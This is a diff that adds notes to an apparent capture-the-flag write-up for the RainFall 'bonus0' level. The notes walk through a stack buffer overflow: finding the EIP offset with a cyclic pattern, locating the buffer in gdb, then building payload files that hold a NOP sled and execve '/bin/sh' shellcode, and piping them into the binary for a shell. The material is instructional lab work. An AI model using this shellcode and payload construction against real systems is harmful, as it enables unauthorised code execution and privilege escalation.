@@ -374,3 +374,71 @@ bonus0@RainFall:~$ su bonus1
 Password:
 bonus1@RainFall:~$
 ```
+
+Notes:
+
+Simple method. If you write more than 20 bytes in the first input, and more than 20 bytes in the second input, `strcpy(param_1,buffer1);` will write undefined bytes in the buffer, maybe `param_2` also. And the `strcat` will write undefined bytes in the buffer. So we overflow the buffer of the main function, and we can overwrite the EIP.
+
+First input:
+```bash
+01234567890123456789
+```
+Second input:
+```bash
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+```bash
+(gdb) info registers
+...
+eip            0x41336141	0x41336141
+...
+```
+We can see that the EIP is overwritten with `0x41336141`, so the offset is 9 bytes.
+
+Now, we will find the address of the `p` buffer.
+```bash
+(gdb) disass p
+Dump of assembler code for function p:
+...
+   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
+   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
+...  
+End of assembler dump.
+(gdb) 
+```
+We can see `lea` wich load the address of the buffer in `eax`. So the buffer adress is `ebp - 0x1008`.
+So we can set a breakpoint just before the `lea` instruction, run the program, and examine the stack to find the address of the buffer.
+```bash
+(gdb) break *0x80484d0
+Breakpoint 1 at 0x80484d0
+(gdb) run
+Starting program: /home/user/bonus0/bonus0 
+ - 
+
+Breakpoint 1, 0x080484d0 in p ()
+(gdb) x $ebp-0x1008
+0xbfffe680:	0x00000000
+```
+The address of the buffer is `0xbfffe680`.
+
+So we want write the shellcode in the buffer, and copy the address of the buffer in the EIP to execute the shellcode.
+
+First argument:
+```bash
+python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
+```
+For the second argument, we take the address of the buffer, and we add 80 bytes to be sure that the shellcode is executed (with `NOP` instructions). So we take `0xbfffe6d0` -> `\xd0\xe6\xff\xbf`.
+Second argument:
+```bash
+python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7' > /tmp/second
+```
+
+We run the program:
+```bash
+(cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+```
